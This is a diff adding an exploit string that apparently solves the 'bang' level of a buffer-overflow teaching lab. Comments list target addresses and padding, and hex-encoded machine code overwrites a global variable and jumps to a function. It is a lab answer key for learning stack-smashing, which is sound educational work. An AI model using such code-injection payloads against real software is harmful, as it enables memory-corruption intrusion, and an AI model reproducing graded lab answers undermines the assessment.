@@ -1,0 +1,15 @@
+/* my cookie located at 0x804c220, global_value located at 0x804c218 */
+/* bang located at 0x08048d05 */
+
+/* Padding required:	44bytes */
+/* local buffer starts at 0x55683408 */
+
+b8 0d ec 7e 7f       	/* mov    $0x7f7eec0d,%eax */
+bb 18 c2 04 08       	/* mov    $0x804c218,%ebx */
+89 03                	/* mov    %eax,(%ebx) */
+68 05 8d 04 08       	/* push   $0x8048d05 */
+c3    			/* ret */
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00
+
